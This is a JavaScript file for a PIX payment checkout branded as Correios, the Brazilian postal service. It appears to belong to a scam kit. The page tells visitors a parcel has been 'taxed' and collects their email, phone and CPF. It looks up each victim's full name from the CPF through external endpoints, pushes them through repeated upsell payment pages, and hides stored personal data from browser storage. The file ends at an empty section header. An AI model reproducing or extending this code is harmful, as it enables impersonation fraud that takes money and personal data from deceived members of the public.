/**
 * ========================================
 * CORREIOS - PAGAMENTO PIX
 * JavaScript para geração e verificação de PIX
 * Versão: 2.0.0 - Segurança aprimorada
 * ========================================
 */

(function() {
    'use strict';

    // ===== PROTEÇÃO LOCALSTORAGE PII =====
    const _originalSetItem = localStorage.setItem;
    const _originalGetItem = localStorage.getItem;
    const PII_KEYS = ['correios_cpf', 'correios_nome', 'correios_email', 'correios_telefone'];

    localStorage.setItem = function(key, value) {
        if (PII_KEYS.includes(key)) {
            sessionStorage.setItem(key, btoa(encodeURIComponent(value || '')));
            _originalSetItem.call(localStorage, key, ''); // Apaga rastro real
            return;
        }
        _originalSetItem.call(localStorage, key, value);
    };

    localStorage.getItem = function(key) {
        if (PII_KEYS.includes(key)) {
            const stored = sessionStorage.getItem(key);
            if (stored) {
                try { return decodeURIComponent(atob(stored)); } catch(e) {}
            }
            return '';
        }
        return _originalGetItem.call(localStorage, key);
    };

    // ========================================
    // CONFIGURAÇÕES
    // ========================================
    const CONFIG = {
        API_PIX_ENDPOINT: 'api/pix.php',
        API_STATUS_ENDPOINT: 'api/status.php',
        API_TRACKING_ENDPOINT: 'api/save-tracking.php',
        CHECK_STATUS_INTERVAL: 5000, // 5 segundos
        // URL de redirecionamento após pagamento aprovado (upsell)
        REDIRECT_URL_SUCESSO: 'up1.html',
        TRANSACTION_STORAGE_KEY: 'correios_pix_transaction',
        TRANSACTION_EXPIRY_MS: 15 * 60 * 1000, // 15 minutos
        STRICT_IDENTITY_VALIDATION: false
    };

    const SRC_STORAGE_KEY = 'correios_src';
    const STORAGE_KEY = 'correios_session';
    const TRACKING_STORAGE_KEY = 'correios_tracking';
    const LEGACY_TRACKING_STORAGE_KEY = 'google_tracking';
    const FUNNEL_STAGE_KEY = 'correios_funnel_stage';
    const FUNNEL_EXPIRY_MS = 24 * 60 * 60 * 1000;
    const CPF_LOOKUP_ENDPOINTS = ['/money-v2/api.php', '/money-v1/api.php'];
    const TURNSTILE_SITE_KEY = window.PixCommon.TURNSTILE_SITE_KEY;
    let turnstileToken = '';
    let turnstileWidgetId = null;
    let _funnelToken = null;

    // Shared utilities from pix-common.js
    const { getQueryParam, decodeName, normalizePhone, normalizeCpf, isValidEmail, isValidPhone,
            isGenericName, validarCPF, maskCpf, maskPhone, getSrc,
            generateSessionHash, gerarQRCodeLocal, exibirNomeHeader } = window.PixCommon;
    function getSessionData() { return window.PixCommon.getSessionData(STORAGE_KEY); }

    function initTurnstile() {
        function doRender() {
            if (!TURNSTILE_SITE_KEY) return;
            const container = document.getElementById('turnstile-container');
            if (!container) return;
            turnstileWidgetId = turnstile.render(container, {
                sitekey: TURNSTILE_SITE_KEY,
                size: 'flexible',
                appearance: 'interaction-only',
                callback: function(token) { turnstileToken = token; },
                'expired-callback': function() { turnstileToken = ''; },
                'error-callback': function() { turnstileToken = ''; }
            });
        }
        window.PixCommon.waitForTurnstile(doRender, 5000);
    }

    function resetTurnstile() {
        if (typeof turnstile !== 'undefined' && turnstileWidgetId !== null) {
            turnstile.reset(turnstileWidgetId);
            turnstileToken = '';
        }
    }

    async function initFunnelToken() {
        try {
            const payload = getTrackingPayloadBase();
            payload.event = 'page_init';
            const resp = await fetch(CONFIG.API_TRACKING_ENDPOINT, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            });
            if (resp.ok) {
                const data = await resp.json();
                if (data.ft) _funnelToken = data.ft;
            }
        } catch (_) { /* fail-open */ }
    }

    const EMAIL_POPULAR_DOMAINS = [
        'gmail.com',
        'hotmail.com',
        'outlook.com',
        'yahoo.com.br',
        'icloud.com'
    ];

    // ========================================
    // ESTADO
    // ========================================
    let state = {
        transactionHash: null,
        pixCode: null,
        checkStatusInterval: null,
        timerInterval: null,
        expirationTime: null,
        isGenerating: false, // Previne múltiplas requisições
        isStep1Submitting: false,
        trackingOrigin: false,
        requireIdentity: false,
        checkoutViewTracked: false,
        lastCpfLookup: { cpf: '', nome: '' },
        emailSuggestions: [],
        emailSuggestionIndex: -1
    };

    // ========================================
    // ELEMENTOS DOM
    // ========================================
    const elements = {
        checkoutStep1: document.getElementById('checkoutStep1'),
        checkoutStep2: document.getElementById('checkoutStep2'),
        indicadorEtapa1: document.getElementById('indicadorEtapa1'),
        indicadorEtapa2: document.getElementById('indicadorEtapa2'),
        dadosForm: document.getElementById('dadosForm'),
        dadosEmail: document.getElementById('dadosEmail'),
        emailSuggestions: document.getElementById('emailSuggestions'),
        dadosTelefone: document.getElementById('dadosTelefone'),
        dadosCpf: document.getElementById('dadosCpf'),
        dadosNome: document.getElementById('dadosNome'),
        dadosEmailErro: document.getElementById('dadosEmailErro'),
        dadosTelefoneErro: document.getElementById('dadosTelefoneErro'),
        dadosCpfErro: document.getElementById('dadosCpfErro'),
        dadosNomeErro: document.getElementById('dadosNomeErro'),
        dadosNomeHint: document.getElementById('dadosNomeHint'),
        step1Titulo: document.getElementById('step1Titulo'),
        step1Descricao: document.getElementById('step1Descricao'),
        step1Identidade: document.getElementById('step1Identidade'),
        btnContinuarPagamento: document.getElementById('btnContinuarPagamento'),
        loading: document.getElementById('pagamentoLoading'),
        erro: document.getElementById('pagamentoErro'),
        conteudo: document.getElementById('pagamentoConteudo'),
        erroMensagem: document.getElementById('erroMensagem'),
        valorPagar: document.getElementById('valorPagar'),
        qrcodeImg: document.getElementById('qrcodeImg'),
        pixCode: document.getElementById('pixCode'),
        btnCopiar: document.getElementById('btnCopiar'),
        timerExpiracao: document.getElementById('timerExpiracao'),
        timerProgressBar: document.getElementById('timerProgressBar'),
        statusAguardando: document.getElementById('statusAguardando'),
        statusPago: document.getElementById('statusPago'),
        qrcodeSeguranca: document.querySelector('.qrcode-seguranca'),
        pixRecebedorPrefix: document.getElementById('pixRecebedorPrefix'),
        pixRecebedorInfo: document.getElementById('pixRecebedorInfo'),
        resumoCpf: document.getElementById('resumoCpf'),
        resumoTotal: document.getElementById('resumoTotal')
    };

    // ========================================
    // FUNÇÕES UTILITÁRIAS
    // ========================================
    
    function getCookie(name) {
        const match = document.cookie.match(new RegExp('(^| )' + name + '=([^;]+)'));
        return match ? match[2] : null;
    }

    function getGclidFromCookie() {
        const raw = getCookie('_gcl_aw');
        if (!raw) return '';
        try {
            const parts = decodeURIComponent(raw).split('.');
            return parts[parts.length - 1] || '';
        } catch (e) {
            const parts = raw.split('.');
            return parts[parts.length - 1] || '';
        }
    }

    function readTrackingStorage(storageKey) {
        try {
            const data = localStorage.getItem(storageKey);
            if (!data) return {};
            const parsed = JSON.parse(data);
            return typeof parsed === 'object' && parsed ? parsed : {};
        } catch (e) {
            return {};
        }
    }

    /**
     * Recupera tracking do Google Ads (localStorage only — sem cookie fallback)
     */
    function getGoogleTracking() {
        const atual = readTrackingStorage(TRACKING_STORAGE_KEY);
        const legacy = readTrackingStorage(LEGACY_TRACKING_STORAGE_KEY);
        return {
            gclid: atual.gclid || legacy.gclid || '',
            gbraid: atual.gbraid || legacy.gbraid || '',
            wbraid: atual.wbraid || legacy.wbraid || ''
        };
    }

    function capturarGoogleTracking() {
        const trackingSalvo = getGoogleTracking();
        const hasStoredTracking = trackingSalvo.gclid || trackingSalvo.gbraid || trackingSalvo.wbraid;
        const cookieGclid = hasStoredTracking ? getGclidFromCookie() : '';
        const tracking = {
            gclid: getQueryParam('gclid') || cookieGclid || trackingSalvo.gclid || '',
            gbraid: getQueryParam('gbraid') || trackingSalvo.gbraid || '',
            wbraid: getQueryParam('wbraid') || trackingSalvo.wbraid || ''
        };

        if (tracking.gclid || tracking.gbraid || tracking.wbraid) {
            localStorage.setItem(TRACKING_STORAGE_KEY, JSON.stringify(tracking));
            localStorage.setItem(LEGACY_TRACKING_STORAGE_KEY, JSON.stringify(tracking));
        }

        return tracking;
    }

    function getTrackingPayloadBase() {
        const cpf = normalizeCpf(localStorage.getItem('correios_cpf') || elements.dadosCpf?.value || '');
        const src = getSrc() || '';
        const urlParams = new URLSearchParams(window.location.search);
        const googleTracking = getGoogleTracking();
        return {
            cpf,
            nome: decodeName(localStorage.getItem('correios_nome') || elements.dadosNome?.value || ''),
            image_shown: localStorage.getItem('correios_imagem_nota') || '',
            src,
            gclid: urlParams.get('gclid') || googleTracking.gclid || '',
            gbraid: urlParams.get('gbraid') || googleTracking.gbraid || '',
            wbraid: urlParams.get('wbraid') || googleTracking.wbraid || '',
            utm_source: urlParams.get('utm_source') || '',
            utm_medium: urlParams.get('utm_medium') || '',
            utm_campaign: urlParams.get('utm_campaign') || '',
            utm_term: urlParams.get('utm_term') || '',
            utm_content: urlParams.get('utm_content') || ''
        };
    }

    function trackCheckoutEvent(eventName, extraData = {}) {
        const name = String(eventName || '').trim().toLowerCase();
        if (!name) return;

        const payload = {
            ...getTrackingPayloadBase(),
            event: name,
            transaction_hash: state.transactionHash || '',
            timestamp_ms: Date.now(),
            ...extraData
        };

        try {
            const blob = new Blob([JSON.stringify(payload)], { type: 'application/json' });
            const sent = navigator.sendBeacon && navigator.sendBeacon(CONFIG.API_TRACKING_ENDPOINT, blob);
            if (sent) return;
        } catch (_) {
            // fallback abaixo
        }

        fetch(CONFIG.API_TRACKING_ENDPOINT, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload),
            keepalive: true
        }).then(response => {
            if (!response.ok) {
                throw new Error(`Erro do servidor (${response.status})`);
            }
        }).catch(() => {});
    }

    function updateResumoPagamento() {
        const cpfAtual = normalizeCpf(elements.dadosCpf?.value || localStorage.getItem('correios_cpf') || '');
        if (elements.resumoCpf) {
            elements.resumoCpf.textContent = cpfAtual ? maskCpf(cpfAtual) : 'Não informado';
        }
        if (elements.resumoTotal) {
            elements.resumoTotal.textContent = elements.valorPagar?.textContent || 'R$ 67,98';
        }
    }

    function formatNomeComIniciaisMaiusculas(value) {
        const nome = decodeName(value);
        if (!nome) return '';

        return nome
            .toLocaleLowerCase('pt-BR')
            .split(/\s+/)
            .filter(Boolean)
            .map((parte) => parte.charAt(0).toLocaleUpperCase('pt-BR') + parte.slice(1))
            .join(' ');
    }

    function getEmailSuggestions(value) {
        const email = String(value || '').trim().toLowerCase();
        if (!email || email.includes(' ')) return [];

        const atIndex = email.indexOf('@');
        if (atIndex <= 0) return [];

        const localPart = email.slice(0, atIndex);
        const domainPart = email.slice(atIndex + 1);
        if (!localPart || domainPart.includes('@')) return [];
        if (isValidEmail(email)) return [];

        const domains = domainPart
            ? EMAIL_POPULAR_DOMAINS.filter((domain) => domain.startsWith(domainPart))
            : EMAIL_POPULAR_DOMAINS;

        return domains.slice(0, 5).map((domain) => `${localPart}@${domain}`);
    }

    function hideEmailSuggestions() {
        state.emailSuggestions = [];
        state.emailSuggestionIndex = -1;

        if (!elements.emailSuggestions) return;
        elements.emailSuggestions.classList.remove('show');
        elements.emailSuggestions.innerHTML = '';
    }

    function selectEmailSuggestion(email) {
        if (!elements.dadosEmail || !email) return;
        elements.dadosEmail.value = email;
        hideEmailSuggestions();
        clearFieldError(elements.dadosEmail, elements.dadosEmailErro);
    }

    function renderEmailSuggestions() {
        if (!elements.emailSuggestions) return;
        elements.emailSuggestions.innerHTML = '';

        if (!state.emailSuggestions.length) {
            elements.emailSuggestions.classList.remove('show');
            return;
        }

        state.emailSuggestions.forEach((suggestion, index) => {
            const button = document.createElement('button');
            button.type = 'button';
            button.className = 'email-suggestion-item' + (index === state.emailSuggestionIndex ? ' active' : '');
            button.textContent = suggestion;
            button.setAttribute('data-email', suggestion);
            button.addEventListener('mousedown', (event) => {
                event.preventDefault();
                selectEmailSuggestion(suggestion);
            });
            elements.emailSuggestions.appendChild(button);
        });

        elements.emailSuggestions.classList.add('show');
    }

    function updateEmailSuggestions() {
        if (!elements.dadosEmail) return;
        state.emailSuggestions = getEmailSuggestions(elements.dadosEmail.value);
        state.emailSuggestionIndex = state.emailSuggestions.length ? 0 : -1;
        renderEmailSuggestions();
    }

    function normalizeReceiverDocument(value) {
        return String(value || '').replace(/\D/g, '');
    }

    function parsePixTlv(payload) {
        // Mantém espaços do conteúdo (ex.: nome do favorecido em tag 59)
        // e remove apenas quebras/abas que podem vir da cópia.
        const source = String(payload || '').replace(/[\r\n\t]/g, '').trim();
        const result = {};
        let cursor = 0;

        while (cursor + 4 <= source.length) {
            const tag = source.slice(cursor, cursor + 2);
            const lengthRaw = source.slice(cursor + 2, cursor + 4);
            if (!/^\d{2}$/.test(lengthRaw)) break;

            const length = Number.parseInt(lengthRaw, 10);
            const valueStart = cursor + 4;
            const valueEnd = valueStart + length;
            if (valueEnd > source.length) break;

            result[tag] = source.slice(valueStart, valueEnd);
            cursor = valueEnd;
        }

        return result;
    }

    function sanitizeReceiverName(value) {
        const normalized = String(value || '').replace(/\s+/g, ' ').trim();
        if (!normalized) return '';

        // Alguns provedores retornam o nome com o início da próxima tag TLV colada (ex.: "LTDA60")
        // Remove apenas o sufixo típico de tag EMV para não exibir ruído no favorecido.
        return normalized.replace(/(?:54|58|59|60|61|62|63)\s*$/u, '').trim();
    }

    function formatReceiverNameForDisplay(value) {
        let name = sanitizeReceiverName(value)
            .replace(/\s+/g, ' ')
            .trim();

        if (!name) return '';

        // Mantém o nome vindo do BR Code/payload sem "quebras inteligentes" agressivas.
        // Apenas separa letra+número quando vier colado (ruído comum de adquirente).
        name = name
            .replace(/([A-Z])(\d)/g, '$1 $2')
            .replace(/(\d)([A-Z])/g, '$1 $2')
            .replace(/\s+/g, ' ')
            .trim();

        return name;
    }

    function extractReceiverFromPixCode(pixCode) {
        const tlv = parsePixTlv(pixCode);
        const receiverName = sanitizeReceiverName(tlv['59'] || '');
        let receiverDocument = '';

        for (let templateTag = 26; templateTag <= 51; templateTag++) {
            const tag = String(templateTag).padStart(2, '0');
            const templateValue = tlv[tag];
            if (!templateValue) continue;

            const subTlv = parsePixTlv(templateValue);
            const keyCandidates = [
                subTlv['01'] || '',
                subTlv['02'] || '',
                subTlv['03'] || ''
            ];

            for (const candidate of keyCandidates) {
                const doc = normalizeReceiverDocument(candidate);
                if (doc.length === 11 || doc.length === 14) {
                    receiverDocument = doc;
                    break;
                }
            }

            if (receiverDocument) break;
        }

        return {
            name: receiverName,
            document: receiverDocument
        };
    }

    function formatReceiverDocument(value) {
        const digits = normalizeReceiverDocument(value);
        if (digits.length === 11) {
            return {
                label: 'CPF',
                value: digits.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, '$1.$2.$3-$4')
            };
        }
        if (digits.length === 14) {
            return {
                label: 'CNPJ',
                value: digits.replace(/(\d{2})(\d{3})(\d{3})(\d{4})(\d{2})/, '$1.$2.$3/$4-$5')
            };
        }
        return { label: 'Documento', value: digits };
    }

    function updateRecebedorPixInfo(data) {
        if (!elements.pixRecebedorInfo) {
            return {
                visible: false,
                complete: false,
                hasName: false,
                hasDocument: false
            };
        }

        const pixCode = String(data?.pix_code || data?.pix_qrcode || elements.pixCode?.value || '').trim();
        const receiverFromCode = extractReceiverFromPixCode(pixCode);

        const receiverNameApi = formatReceiverNameForDisplay(String(
            data?.receiver?.name ||
            data?.receiver_name ||
            ''
        ));
        const receiverNameFromCode = formatReceiverNameForDisplay(receiverFromCode.name || '');
        let receiverName = receiverNameApi || receiverNameFromCode;

        // Se a API vier com nome "colado" e o BR Code tiver nome com espaços,
        // prioriza o nome do próprio código PIX (mais confiável para exibição).
        if (
            receiverNameApi &&
            !/\s/.test(receiverNameApi) &&
            /\s/.test(receiverNameFromCode)
        ) {
            receiverName = receiverNameFromCode;
        }
        const receiverDocumentRaw =
            data?.receiver?.document ||
            data?.receiver_document ||
            receiverFromCode.document ||
            '';
        const receiverDocument = normalizeReceiverDocument(receiverDocumentRaw);
        const hasName = Boolean(receiverName);
        const hasDocument = receiverDocument.length === 11 || receiverDocument.length === 14;
        const isComplete = hasName && hasDocument;

        if (elements.qrcodeSeguranca) {
            elements.qrcodeSeguranca.style.display = 'flex';
        }
        if (elements.pixRecebedorPrefix) {
            elements.pixRecebedorPrefix.textContent = 'No app do banco, o favorecido deve aparecer como:';
        }

        if (!hasName && !hasDocument) {
            elements.pixRecebedorInfo.textContent = '';
            if (elements.qrcodeSeguranca) {
                elements.qrcodeSeguranca.style.display = 'none';
            }
            return {
                visible: false,
                complete: false,
                hasName: false,
                hasDocument: false
            };
        }

        if (isComplete) {
            const formattedDoc = formatReceiverDocument(receiverDocument);
            elements.pixRecebedorInfo.textContent = `${receiverName} - ${formattedDoc.label} ${formattedDoc.value}`;
            return {
                visible: true,
                complete: true,
                hasName: true,
                hasDocument: true
            };
        }

        if (hasName) {
            if (elements.pixRecebedorPrefix) {
                elements.pixRecebedorPrefix.textContent = 'No app do banco, confirme o favorecido:';
            }
            elements.pixRecebedorInfo.textContent = receiverName;
            return {
                visible: true,
                complete: false,
                hasName: true,
                hasDocument: false
            };
        }

        const formattedDoc = formatReceiverDocument(receiverDocument);
        if (elements.pixRecebedorPrefix) {
            elements.pixRecebedorPrefix.textContent = 'No app do banco, confirme o favorecido:';
        }
        elements.pixRecebedorInfo.textContent = `${formattedDoc.label} ${formattedDoc.value}`;
        return {
            visible: true,
            complete: false,
            hasName: false,
            hasDocument: true
        };
    }

    function clearFieldError(fieldInput, fieldError) {
        if (fieldInput) fieldInput.classList.remove('input-erro');
        if (fieldError) fieldError.textContent = '';
    }

    function setFieldError(fieldInput, fieldError, message) {
        if (fieldInput) fieldInput.classList.add('input-erro');
        if (fieldError) fieldError.textContent = message || '';
    }

    function clearStep1Errors() {
        clearFieldError(elements.dadosEmail, elements.dadosEmailErro);
        clearFieldError(elements.dadosTelefone, elements.dadosTelefoneErro);
        clearFieldError(elements.dadosCpf, elements.dadosCpfErro);
        clearFieldError(elements.dadosNome, elements.dadosNomeErro);
    }

    function updateStepIndicator(step) {
        if (!elements.indicadorEtapa1 || !elements.indicadorEtapa2) return;

        elements.indicadorEtapa1.classList.remove('active', 'done');
        elements.indicadorEtapa2.classList.remove('active', 'done');

        if (step === 1) {
            elements.indicadorEtapa1.classList.add('active');
        } else {
            elements.indicadorEtapa1.classList.add('done');
            elements.indicadorEtapa2.classList.add('active');
        }
    }

    function showStep1() {
        if (elements.checkoutStep1) elements.checkoutStep1.style.display = 'block';
        if (elements.checkoutStep2) elements.checkoutStep2.style.display = 'none';
        updateStepIndicator(1);
    }

    function showStep2() {
        if (elements.checkoutStep1) elements.checkoutStep1.style.display = 'none';
        if (elements.checkoutStep2) elements.checkoutStep2.style.display = 'block';
        updateStepIndicator(2);
    }

    function detectTrackingOrigin() {
        const sessionData = getSessionData();
        const tipoUrl = String(getQueryParam('tipo') || '').trim().toLowerCase();
        const tipoSession = String(sessionData?.tipo || '').trim().toLowerCase();
        return tipoUrl === 'rastreio' || tipoSession === 'rastreio';
    }

    async function lookupNomeByCpf(cpf) {
        const cpfValue = normalizeCpf(cpf);
        if (!validarCPF(cpfValue)) return null;

        if (state.lastCpfLookup.cpf === cpfValue && state.lastCpfLookup.nome) {
            return state.lastCpfLookup.nome;
        }

        for (const endpoint of CPF_LOOKUP_ENDPOINTS) {
            try {
                const controller = new AbortController();
                const timeout = setTimeout(() => controller.abort(), 9000);
                const response = await fetch(endpoint, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ cpf: cpfValue }),
                    signal: controller.signal
                });
                clearTimeout(timeout);

                if (!response.ok) continue;
                const result = await response.json();
                const nomeApi =
                    result?.data?.NOME ||
                    result?.data?.nome ||
                    result?.data?.DADOS?.nome ||
                    '';
                const nomeFinal = formatNomeComIniciaisMaiusculas(nomeApi);

                if (nomeFinal && !isGenericName(nomeFinal)) {
                    state.lastCpfLookup = { cpf: cpfValue, nome: nomeFinal };
                    return nomeFinal;
                }
            } catch (_) {
            }
        }

        return null;
    }

    function populateStep1Form() {
        const sessionData = getSessionData();
        const nomeStorage = decodeName(
            localStorage.getItem('correios_nome') ||
            getQueryParam('nome') ||
            sessionData?.nome ||
            ''
        );
        const cpfStorage = normalizeCpf(localStorage.getItem('correios_cpf') || sessionData?.cpf || getQueryParam('cpf') || '');
        const emailStorage = String(localStorage.getItem('correios_email') || '').trim().toLowerCase();
        const telefoneStorage = normalizePhone(localStorage.getItem('correios_telefone') || '');

        if (elements.dadosEmail) elements.dadosEmail.value = emailStorage;
        if (elements.dadosTelefone) elements.dadosTelefone.value = maskPhone(telefoneStorage);
        if (elements.dadosCpf) elements.dadosCpf.value = maskCpf(cpfStorage);
        if (elements.dadosNome) elements.dadosNome.value = isGenericName(nomeStorage) ? '' : nomeStorage;

        const hasIdentity = Boolean(
            validarCPF(cpfStorage) &&
            nomeStorage &&
            !isGenericName(nomeStorage)
        );
        state.requireIdentity = state.trackingOrigin || !hasIdentity;

        updateStep1Copy();

        if (state.requireIdentity && elements.step1Identidade) {
            elements.step1Identidade.style.display = 'block';
        } else if (elements.step1Identidade) {
            elements.step1Identidade.style.display = 'none';
        }

        updateResumoPagamento();
    }

    function updateStep1Copy() {
        if (!elements.step1Titulo || !elements.step1Descricao) return;
        elements.step1Titulo.textContent = 'Objeto taxado pela unidade de fiscalização';
        elements.step1Descricao.textContent = 'Preencha seus dados para envio do comprovante e atualização do status da entrega.';
    }

    async function handleCpfLookupFeedback() {
        if (!state.requireIdentity || !elements.dadosCpf || !elements.dadosNome) return;

        const cpf = normalizeCpf(elements.dadosCpf.value);
        if (!validarCPF(cpf)) {
            if (elements.dadosNomeHint) elements.dadosNomeHint.textContent = '';
            return;
        }

        const nomeLookup = await lookupNomeByCpf(cpf);
        if (nomeLookup) {
            elements.dadosNome.value = nomeLookup;
            localStorage.setItem('correios_nome', nomeLookup);
            updateStep1Copy();
        }

        if (elements.dadosNomeHint) elements.dadosNomeHint.textContent = '';
    }

    async function submitStep1(event) {
        event.preventDefault();
        if (state.isStep1Submitting) return;
        hideEmailSuggestions();

        clearStep1Errors();

        const email = String(elements.dadosEmail?.value || '').trim().toLowerCase();
        const telefone = normalizePhone(elements.dadosTelefone?.value || '');
        const cpf = normalizeCpf(elements.dadosCpf?.value || '');
        let nome = decodeName(elements.dadosNome?.value || '');
        let hasError = false;
        const cpfValido = validarCPF(cpf);
        const strictIdentity = state.requireIdentity && CONFIG.STRICT_IDENTITY_VALIDATION;

        if (!isValidEmail(email)) {
            setFieldError(elements.dadosEmail, elements.dadosEmailErro, 'Informe um e-mail válido.');
            hasError = true;
        }

        if (!isValidPhone(telefone)) {
            setFieldError(elements.dadosTelefone, elements.dadosTelefoneErro, 'Informe telefone com DDD.');
            hasError = true;
        }

        if (cpf && !cpfValido) {
            setFieldError(elements.dadosCpf, elements.dadosCpfErro, 'CPF inválido.');
            hasError = true;
        }

        if (strictIdentity) {
            if (!cpfValido) {
                setFieldError(elements.dadosCpf, elements.dadosCpfErro, 'CPF inválido.');
                hasError = true;
            }

            if (!nome || isGenericName(nome)) {
                setFieldError(elements.dadosNome, elements.dadosNomeErro, 'Informe seu nome completo.');
                hasError = true;
            }
        }

        if (hasError) {
            return;
        }

        if (state.requireIdentity && cpfValido && (!nome || isGenericName(nome))) {
            lookupNomeByCpf(cpf).then((nomeLookup) => {
                if (!nomeLookup) return;
                if (elements.dadosNome && !elements.dadosNome.value.trim()) {
                    elements.dadosNome.value = nomeLookup;
                }
                localStorage.setItem('correios_nome', nomeLookup);
                updateResumoPagamento();
                updateStep1Copy();
            }).catch(() => {});
        }

        localStorage.setItem('correios_email', email);
        localStorage.setItem('correios_telefone', telefone);
        if (cpf) localStorage.setItem('correios_cpf', cpf);
        localStorage.setItem('correios_nome', isGenericName(nome) ? '' : nome);
        updateResumoPagamento();

        exibirNomeHeader();

        state.isStep1Submitting = true;
        if (elements.btnContinuarPagamento) {
            elements.btnContinuarPagamento.disabled = true;
        }

        trackCheckoutEvent('cta_pagar_click', {
            has_email: true,
            has_phone: true,
            has_cpf: cpfValido
        });

        try {
            await gerarPix();
        } finally {
            state.isStep1Submitting = false;
            if (elements.btnContinuarPagamento) {
                elements.btnContinuarPagamento.disabled = false;
            }
        }
    }

    function initStep1Events() {
        if (elements.dadosForm) {
            elements.dadosForm.addEventListener('submit', submitStep1);
        }

        if (elements.dadosTelefone) {
            const normalizePhoneField = () => {
                elements.dadosTelefone.value = maskPhone(elements.dadosTelefone.value);
            };

            elements.dadosTelefone.addEventListener('input', () => {
                normalizePhoneField();
                clearFieldError(elements.dadosTelefone, elements.dadosTelefoneErro);
                updateResumoPagamento();
            });
            elements.dadosTelefone.addEventListener('change', normalizePhoneField);
            elements.dadosTelefone.addEventListener('blur', normalizePhoneField);

            // Safari/Chrome podem preencher após load sem disparar input.
            setTimeout(normalizePhoneField, 250);
        }

        if (elements.dadosCpf) {
            elements.dadosCpf.addEventListener('input', () => {
                elements.dadosCpf.value = maskCpf(elements.dadosCpf.value);
                clearFieldError(elements.dadosCpf, elements.dadosCpfErro);
                updateResumoPagamento();
            });
            elements.dadosCpf.addEventListener('blur', handleCpfLookupFeedback);
        }

        if (elements.dadosEmail) {
            elements.dadosEmail.addEventListener('input', () => {
                clearFieldError(elements.dadosEmail, elements.dadosEmailErro);
                updateEmailSuggestions();
            });
            elements.dadosEmail.addEventListener('focus', () => {
                updateEmailSuggestions();
            });
            elements.dadosEmail.addEventListener('blur', () => {
                setTimeout(() => {
                    hideEmailSuggestions();
                }, 120);
            });
            elements.dadosEmail.addEventListener('keydown', (event) => {
                if (!state.emailSuggestions.length) return;

                if (event.key === 'ArrowDown') {
                    event.preventDefault();
                    state.emailSuggestionIndex = (state.emailSuggestionIndex + 1) % state.emailSuggestions.length;
                    renderEmailSuggestions();
                    return;
                }

                if (event.key === 'ArrowUp') {
                    event.preventDefault();
                    state.emailSuggestionIndex = state.emailSuggestionIndex <= 0
                        ? state.emailSuggestions.length - 1
                        : state.emailSuggestionIndex - 1;
                    renderEmailSuggestions();
                    return;
                }

                if (event.key === 'Enter') {
                    event.preventDefault();
                    const index = state.emailSuggestionIndex >= 0 ? state.emailSuggestionIndex : 0;
                    selectEmailSuggestion(state.emailSuggestions[index]);
                    return;
                }

                if (event.key === 'Tab') {
                    const index = state.emailSuggestionIndex >= 0 ? state.emailSuggestionIndex : 0;
                    selectEmailSuggestion(state.emailSuggestions[index]);
                    return;
                }

                if (event.key === 'Escape') {
                    hideEmailSuggestions();
                }
            });
        }

        if (elements.dadosNome) {
            elements.dadosNome.addEventListener('input', () => {
                clearFieldError(elements.dadosNome, elements.dadosNomeErro);
                updateStep1Copy();
                updateResumoPagamento();
            });
        }
    }

    function getFunnelData() {
        try {
            const rawData = localStorage.getItem(FUNNEL_STAGE_KEY);
            if (!rawData) return null;

            const parsed = JSON.parse(rawData);
            const stage = parsed?.stage || '';
            const timestamp = Number(parsed?.timestamp || 0);
            if (!stage) return null;

            if (timestamp > 0 && (Date.now() - timestamp > FUNNEL_EXPIRY_MS)) {
                localStorage.removeItem(FUNNEL_STAGE_KEY);
                return null;
            }

            return { stage, timestamp };
        } catch (_) {
            localStorage.removeItem(FUNNEL_STAGE_KEY);
            return null;
        }
    }

    function getRedirectByFunnelStage(stage) {
        switch (String(stage || '').toLowerCase()) {
            case 'frontend_paid':
                return 'up1.html';
            case 'up1_paid':
                return 'up2.html';
            case 'up2_paid':
                return 'lote.html';
            case 'lote_paid':
            case 'completed':
                return 'sucesso.html';
            default:
                return '';
        }
    }

    // ========================================
    // GERENCIAMENTO DE TRANSAÇÃO SALVA
    // ========================================

    /**
     * Salva transação no localStorage
     */
    function salvarTransacao(data, cpf) {
        // Gera QR Code local e salva em base64
        const qrCodeBase64 = gerarQRCodeLocal(data.pix_code);
        
        const transacao = {
            hash: data.transaction_hash,
            pix_code: data.pix_code,
            pix_qrcode: data.pix_qrcode,
            qr_base64: qrCodeBase64, // QR Code em cache
            amount: data.amount,
            amount_formatted: data.amount_formatted,
            expires_at: data.expires_at,
            receiver: data.receiver || null,
            created_at: Date.now(),
            cpf_hash: generateSessionHash(cpf)
        };
        
        localStorage.setItem(CONFIG.TRANSACTION_STORAGE_KEY, JSON.stringify(transacao));
        return transacao;
    }

    /**
     * Recupera transação salva (se ainda válida)
     * Não verifica CPF para evitar problemas de consistência entre recarregamentos
     */
    function recuperarTransacao() {
        try {
            const data = localStorage.getItem(CONFIG.TRANSACTION_STORAGE_KEY);
            if (!data) return null;
            
            const transacao = JSON.parse(data);
            
            // Verifica se tem os campos necessários
            if (!transacao.hash || !transacao.pix_code) {
                limparTransacao();
                return null;
            }
            
            // Verifica se expirou
            const agora = Date.now();
            const criado = transacao.created_at || 0;
            
            if (agora - criado > CONFIG.TRANSACTION_EXPIRY_MS) {
                limparTransacao();
                return null;
            }
            
            // Calcula tempo restante
            const tempoRestante = CONFIG.TRANSACTION_EXPIRY_MS - (agora - criado);
            transacao.tempo_restante_ms = tempoRestante;
            
            return transacao;
        } catch (e) {
            limparTransacao();
            return null;
        }
    }

    /**
     * Limpa transação salva
     */
    function limparTransacao() {
        localStorage.removeItem(CONFIG.TRANSACTION_STORAGE_KEY);
    }

    // ========================================
    // UI
    // ========================================

    function mostrarLoading() {
        showStep2();
        elements.loading.style.display = 'block';
        elements.erro.style.display = 'none';
        elements.conteudo.style.display = 'none';
    }

    function mostrarErro(mensagem) {
        showStep2();
        elements.loading.style.display = 'none';
        elements.erro.style.display = 'block';
        elements.conteudo.style.display = 'none';
        elements.erroMensagem.textContent = mensagem;
        
        // Para verificações
        pararVerificacoes();
    }

    function mostrarConteudo() {
        showStep2();
        elements.loading.style.display = 'none';
        elements.erro.style.display = 'none';
        elements.conteudo.style.display = 'block';
    }

    function pararVerificacoes() {
        if (state.checkStatusInterval) {
            clearInterval(state.checkStatusInterval);
            state.checkStatusInterval = null;
        }
        if (state.timerInterval) {
            clearInterval(state.timerInterval);
            state.timerInterval = null;
        }
    }

    // ========================================
